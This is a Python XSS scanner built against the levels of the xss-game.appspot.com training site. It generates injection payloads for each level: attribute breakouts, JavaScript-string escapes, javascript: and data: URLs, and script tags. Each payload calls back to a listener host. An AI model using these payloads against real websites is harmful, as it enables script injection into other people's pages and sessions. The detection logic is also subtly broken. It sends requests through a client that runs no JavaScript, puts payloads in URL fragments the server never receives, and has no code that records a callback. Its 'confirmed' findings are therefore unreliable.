#!/usr/bin/env python3
"""
Hybrid XSS Scanner - Combines DOM analysis with blind XSS callbacks
Uses ngrok for out-of-band detection of XSS execution
"""
import asyncio
import aiohttp
import json
import re
import urllib.parse
import time
import uuid
import sqlite3
from pathlib import Path
from bs4 import BeautifulSoup

class BlindXSSCollaborator:
    """Manages blind XSS callbacks via ngrok"""
    
    def __init__(self, ngrok_domain="localhost:8888"):
        self.ngrok_domain = ngrok_domain
        self.callback_db = "xss_callbacks.db"
        self._init_db()
    
    def _init_db(self):
        """Initialize callback tracking database"""
        with sqlite3.connect(self.callback_db) as db:
            db.execute('''
                CREATE TABLE IF NOT EXISTS callbacks (
                    id TEXT PRIMARY KEY,
                    url TEXT,
                    payload TEXT,
                    timestamp REAL,
                    received BOOLEAN DEFAULT 0,
                    received_timestamp REAL
                )
            ''')
    
    def generate_callback_payload(self, callback_id, xss_type="img"):
        """Generate XSS payload with callback URL"""
        callback_url = f"http://{self.ngrok_domain}/callback/{callback_id}"
        
        payloads = {
            "img": f"<img src='{callback_url}'>",
            "script": f"<script src='{callback_url}'></script>", 
            "fetch": f"<script>fetch('{callback_url}')</script>",
            "xhr": f"<script>new Image().src='{callback_url}'</script>",
            "js_eval": f"javascript:fetch('{callback_url}')",
            "onerror": f"<img src=x onerror=\"fetch('{callback_url}')\">"
        }
        
        return payloads.get(xss_type, payloads["img"])
    
    def register_callback(self, callback_id, url, payload):
        """Register a callback expectation"""
        with sqlite3.connect(self.callback_db) as db:
            db.execute('''
                INSERT OR REPLACE INTO callbacks (id, url, payload, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (callback_id, url, payload, time.time()))
    
    def check_callback_received(self, callback_id):
        """Check if callback was received"""
        with sqlite3.connect(self.callback_db) as db:
            result = db.execute('''
                SELECT received FROM callbacks WHERE id = ?
            ''', (callback_id,)).fetchone()
            
            return result and result[0] == 1
    
    async def wait_for_callback(self, callback_id, timeout=10):
        """Wait for callback to be received"""
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if self.check_callback_received(callback_id):
                return True
            await asyncio.sleep(0.5)
        
        return False

class HybridXSSScanner:
    """Scanner that combines DOM analysis with blind XSS detection"""
    
    def __init__(self):
        self.findings = []
        self.collaborator = BlindXSSCollaborator()
    
    async def scan_url(self, url):
        """Comprehensive XSS scan with both methods"""
        print(f"🎯 Hybrid scan: {url}")
        
        # First, analyze page structure without browser
        page_analysis = await self._analyze_page_structure(url)
        print(f"📊 Page type: {page_analysis['page_type']}")
        print(f"📊 Parameters found: {page_analysis.get('parameters', [])}")
        
        # Test different attack vectors based on analysis
        if page_analysis['page_type'] == 'search':
            await self._test_search_xss(url, page_analysis)
        elif page_analysis['page_type'] == 'chat':
            await self._test_chat_stored_xss(url, page_analysis)
        elif page_analysis['page_type'] == 'fragment_spa':
            await self._test_fragment_dom_xss(url, page_analysis)
        elif page_analysis['page_type'] == 'timer':
            await self._test_timer_js_xss(url, page_analysis)
        elif page_analysis['page_type'] == 'signup':
            await self._test_signup_protocol_xss(url, page_analysis)
        elif page_analysis['page_type'] == 'gadget_loader':
            await self._test_gadget_script_xss(url, page_analysis)
        else:
            await self._test_generic_parameters(url, page_analysis)
    
    async def _analyze_page_structure(self, url):
        """Fast page analysis without browser"""
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(url, timeout=10) as resp:
                    html = await resp.text()
                    soup = BeautifulSoup(html, 'html.parser')
                    
                    analysis = {
                        'page_type': 'unknown',
                        'parameters': [],
                        'forms': [],
                        'js_functions': [],
                        'reflection_points': []
                    }
                    
                    # Determine page type from content
                    html_lower = html.lower()
                    
                    if 'sorry, no results' in html_lower and ('search' in html_lower or 'query' in html_lower):
                        analysis['page_type'] = 'search'
                        analysis['parameters'] = ['query', 'q', 'search']
                        
                    elif 'post anything' in html_lower or ('message' in html_lower and 'chat' in html_lower):
                        analysis['page_type'] = 'chat' 
                        analysis['parameters'] = ['message', 'content', 'text']
                        
                    elif 'choosetab' in html and 'location.hash' in html:
                        analysis['page_type'] = 'fragment_spa'
                        analysis['parameters'] = ['fragment']
                        
                    elif 'starttimer' in html_lower and ('timer' in html_lower or 'loading' in html):
                        analysis['page_type'] = 'timer'
                        analysis['parameters'] = ['timer', 'timeout', 'seconds']
                        
                    elif 'signup' in html_lower and 'next' in html_lower:
                        analysis['page_type'] = 'signup'
                        analysis['parameters'] = ['next', 'continue', 'redirect']
                        
                    elif 'includegadget' in html_lower:
                        analysis['page_type'] = 'gadget_loader'
                        analysis['parameters'] = ['gadget']
                    
                    # Extract JavaScript functions for context
                    js_functions = re.findall(r'function\s+(\w+)', html)
                    analysis['js_functions'] = js_functions[:5]
                    
                    # Find forms for parameter discovery
                    for form in soup.find_all('form'):
                        form_params = []
                        for inp in form.find_all(['input', 'textarea']):
                            name = inp.get('name')
                            if name:
                                form_params.append(name)
                        if form_params:
                            analysis['forms'].append(form_params)
                    
                    return analysis
                    
            except Exception as e:
                print(f"❌ Page analysis failed: {e}")
                return {'page_type': 'unknown', 'parameters': []}
    
    async def _test_search_xss(self, url, analysis):
        """Test Level 1: Reflected XSS in search"""
        print("🔍 Testing search reflected XSS...")
        
        for param in analysis['parameters']:
            # Test DOM reflection first (fast)
            dom_result = await self._test_dom_reflection(url, param)
            if dom_result:
                print(f"✅ DOM reflection found in {param}")
                # Generate blind XSS payload for confirmation
                await self._test_blind_xss_confirmation(url, param, "reflected")
                return
    
    async def _test_chat_stored_xss(self, url, analysis):
        """Test Level 2: Stored XSS in chat with filter bypass"""
        print("💬 Testing chat stored XSS...")
        
        # First test if <script> is filtered
        script_filtered = await self._test_script_filtering(url)
        print(f"📊 Script tag filtering: {script_filtered}")
        
        for param in analysis['parameters']:
            if script_filtered:
                # Use bypass techniques
                callback_id = str(uuid.uuid4())[:8]
                bypass_payload = self.collaborator.generate_callback_payload(callback_id, "onerror")
                
                test_url = f"{url}?{param}={urllib.parse.quote(bypass_payload)}"
                self.collaborator.register_callback(callback_id, test_url, bypass_payload)
                
                # Submit payload
                async with aiohttp.ClientSession() as session:
                    try:
                        async with session.get(test_url, timeout=10) as resp:
                            await resp.text()
                        
                        # Wait for blind XSS callback
                        if await self.collaborator.wait_for_callback(callback_id, 15):
                            self._add_finding(
                                "Stored XSS (Filter Bypass)", bypass_payload, test_url,
                                f"Blind XSS callback received for {param} parameter",
                                0.95
                            )
                            return
                            
                    except Exception as e:
                        print(f"❌ Chat XSS test failed: {e}")
    
    async def _test_fragment_dom_xss(self, url, analysis):
        """Test Level 3: Fragment-based DOM XSS"""
        print("🧩 Testing fragment DOM XSS...")
        
        # First check if page processes fragments
        test_fragment = "testfrag123"
        fragment_url = f"{url}#{test_fragment}"
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(fragment_url, timeout=10) as resp:
                    response_text = await resp.text()
                    
                    # Look for signs that fragment is processed
                    if ('choosetab' in response_text.lower() or 
                        'location.hash' in response_text or
                        test_fragment in response_text):
                        
                        print("✅ Fragment processing detected")
                        
                        # Generate attribute-breaking payload
                        callback_id = str(uuid.uuid4())[:8]
                        callback_url = f"http://{self.collaborator.ngrok_domain}/callback/{callback_id}"
                        
                        # Level 3 specific: break out of img src attribute
                        fragment_payload = f"1' onerror='fetch(\"{callback_url}\")' x='"
                        attack_url = f"{url}#{urllib.parse.quote(fragment_payload)}"
                        
                        self.collaborator.register_callback(callback_id, attack_url, fragment_payload)
                        
                        # Visit with fragment payload - DOM will process it
                        async with session.get(attack_url, timeout=10) as frag_resp:
                            await frag_resp.text()
                        
                        # Wait for callback
                        if await self.collaborator.wait_for_callback(callback_id, 10):
                            self._add_finding(
                                "DOM XSS (Fragment)", fragment_payload, attack_url,
                                f"Fragment DOM XSS callback received",
                                0.90
                            )
                            return
                            
            except Exception as e:
                print(f"❌ Fragment XSS test failed: {e}")
    
    async def _test_timer_js_xss(self, url, analysis):
        """Test Level 4: JavaScript context injection"""
        print("⏰ Testing timer JavaScript context XSS...")
        
        for param in analysis['parameters']:
            # Test JavaScript context breaking
            callback_id = str(uuid.uuid4())[:8] 
            callback_url = f"http://{self.collaborator.ngrok_domain}/callback/{callback_id}"
            
            # Level 4 specific: break out of startTimer('...') 
            js_payload = f"3';fetch('{callback_url}');//"
            test_url = f"{url}?{param}={urllib.parse.quote(js_payload)}"
            
            self.collaborator.register_callback(callback_id, test_url, js_payload)
            
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(test_url, timeout=10) as resp:
                        response_text = await resp.text()
                        
                        # Check if payload appears in JavaScript context
                        if ('starttimer' in response_text.lower() and 
                            js_payload in response_text):
                            
                            # Wait for callback
                            if await self.collaborator.wait_for_callback(callback_id, 10):
                                self._add_finding(
                                    "JS Context XSS", js_payload, test_url,
                                    f"JavaScript context injection callback received",
                                    0.92
                                )
                                return
                                
                except Exception as e:
                    print(f"❌ Timer XSS test failed: {e}")
    
    async def _test_signup_protocol_xss(self, url, analysis):
        """Test Level 5: JavaScript protocol injection"""
        print("📝 Testing signup protocol XSS...")
        
        # Test both signup and confirm pages
        test_pages = ['/signup', '/confirm']
        
        for page in test_pages:
            signup_url = url.replace('/frame', f'/frame{page}')
            
            callback_id = str(uuid.uuid4())[:8]
            callback_url = f"http://{self.collaborator.ngrok_domain}/callback/{callback_id}"
            
            # Level 5 specific: javascript: protocol
            protocol_payload = f"javascript:fetch('{callback_url}')"
            test_url = f"{signup_url}?next={urllib.parse.quote(protocol_payload)}"
            
            self.collaborator.register_callback(callback_id, test_url, protocol_payload)
            
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(test_url, timeout=10) as resp:
                        response_text = await resp.text()
                        
                        # Look for Next button with javascript: protocol
                        if (protocol_payload in response_text or 
                            'javascript:' in response_text):
                            
                            # Wait for callback (user would click Next button)
                            if await self.collaborator.wait_for_callback(callback_id, 15):
                                self._add_finding(
                                    "Protocol XSS", protocol_payload, test_url,
                                    f"JavaScript protocol injection callback received",
                                    0.94
                                )
                                return
                                
                except Exception as e:
                    continue
    
    async def _test_gadget_script_xss(self, url, analysis):
        """Test Level 6: External script gadget loading"""
        print("🔧 Testing gadget script XSS...")
        
        callback_id = str(uuid.uuid4())[:8]
        callback_url = f"http://{self.collaborator.ngrok_domain}/callback/{callback_id}"
        
        # Level 6 specific: data: URL bypass
        gadget_payload = f"data:text/javascript,fetch('{callback_url}')"
        fragment_url = f"{url}#{urllib.parse.quote(gadget_payload)}"
        
        self.collaborator.register_callback(callback_id, fragment_url, gadget_payload)
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(fragment_url, timeout=10) as resp:
                    response_text = await resp.text()
                    
                    # Check if includeGadget would process this
                    if ('includegadget' in response_text.lower() and
                        'cannot load a url containing "http"' not in response_text.lower()):
                        
                        # Wait for callback
                        if await self.collaborator.wait_for_callback(callback_id, 10):
                            self._add_finding(
                                "Gadget XSS", gadget_payload, fragment_url,
                                f"External script gadget callback received", 
                                0.88
                            )
                            return
                            
            except Exception as e:
                print(f"❌ Gadget XSS test failed: {e}")
    
    async def _test_generic_parameters(self, url, analysis):
        """Test generic parameters with blind XSS"""
        print("🎯 Testing generic parameters...")
        
        generic_params = ['id', 'page', 'action', 'input', 'data']
        
        for param in generic_params:
            callback_id = str(uuid.uuid4())[:8]
            generic_payload = self.collaborator.generate_callback_payload(callback_id, "onerror")
            test_url = f"{url}?{param}={urllib.parse.quote(generic_payload)}"
            
            self.collaborator.register_callback(callback_id, test_url, generic_payload)
            
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(test_url, timeout=10) as resp:
                        await resp.text()
                    
                    if await self.collaborator.wait_for_callback(callback_id, 5):
                        self._add_finding(
                            "Generic XSS", generic_payload, test_url,
                            f"Generic parameter XSS callback received",
                            0.80
                        )
                        return
                        
                except Exception:
                    continue
    
    async def _test_dom_reflection(self, url, param):
        """Quick test for DOM reflection"""
        test_value = f"XSSTEST{int(time.time())}"
        test_url = f"{url}?{param}={urllib.parse.quote(test_value)}"
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(test_url, timeout=10) as resp:
                    response_text = await resp.text()
                    return test_value in response_text
            except:
                return False
    
    async def _test_script_filtering(self, url):
        """Test if <script> tags are filtered"""
        script_test = "<script>test</script>"
        test_url = f"{url}?test={urllib.parse.quote(script_test)}"
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(test_url, timeout=10) as resp:
                    response_text = await resp.text()
                    return script_test not in response_text
            except:
                return False
    
    async def _test_blind_xss_confirmation(self, url, param, xss_type):
        """Confirm XSS with blind callback"""
        callback_id = str(uuid.uuid4())[:8]
        confirm_payload = self.collaborator.generate_callback_payload(callback_id, "script")
        test_url = f"{url}?{param}={urllib.parse.quote(confirm_payload)}"
        
        self.collaborator.register_callback(callback_id, test_url, confirm_payload)
        
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(test_url, timeout=10) as resp:
                    await resp.text()
                
                if await self.collaborator.wait_for_callback(callback_id, 10):
                    self._add_finding(
                        f"{xss_type.title()} XSS (Confirmed)", confirm_payload, test_url,
                        f"Blind XSS callback confirmed execution",
                        0.98
                    )
                    
            except Exception:
                pass
    
    def _add_finding(self, attack_type, payload, url, evidence, confidence):
        """Add finding to results"""
        finding = {
            "attack_type": attack_type,
            "payload": payload,
            "url": url,
            "evidence": evidence,
            "confidence": confidence,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
        }
        self.findings.append(finding)
        print(f"🎉 FOUND: {attack_type}")
        print(f"   Payload: {payload[:60]}...")
        print(f"   Evidence: {evidence}")

async def main():
    scanner = HybridXSSScanner()
    
    # Test URLs
    test_urls = [
        "https://xss-game.appspot.com/level1/frame",
        "https://xss-game.appspot.com/level2/frame",
        "https://xss-game.appspot.com/level3/frame", 
        "https://xss-game.appspot.com/level4/frame",
        "https://xss-game.appspot.com/level5/frame",
        "https://xss-game.appspot.com/level6/frame"
    ]
    
    print("🔥 Hybrid XSS Scanner - DOM + Blind XSS Detection")
    print("=" * 60)
    print(f"📡 Using ngrok domain: {scanner.collaborator.ngrok_domain}")
    print("=" * 60)
    
    for url in test_urls:
        await scanner.scan_url(url.strip())
        print("=" * 60)
    
    # Results summary
    print(f"\n🎯 HYBRID SCANNER RESULTS:")
    print(f"Total findings: {len(scanner.findings)}")
    
    levels_detected = set()
    for finding in scanner.findings:
        if 'level' in finding['url']:
            level = finding['url'].split('level')[1].split('/')[0]
            levels_detected.add(level)
    
    print(f"\n🏆 XSS Game Levels Detected: {len(levels_detected)}/6")
    print(f"📊 Success Rate: {(len(levels_detected)/6)*100:.1f}%")
    print(f"🎯 Detected Levels: {sorted(levels_detected)}")
    
    # Detailed findings
    for finding in scanner.findings:
        print(f"\n✅ {finding['attack_type']}")
        print(f"   Payload: {finding['payload']}")
        print(f"   Evidence: {finding['evidence']}")
        print(f"   Confidence: {finding['confidence']:.2f}")
    
    # Save results
    with open("hybrid_xss_results.jsonl", "w") as f:
        for finding in scanner.findings:
            f.write(json.dumps(finding) + "\n")
    
    print(f"\n💾 Results saved to hybrid_xss_results.jsonl")

if __name__ == "__main__":
    asyncio.run(main())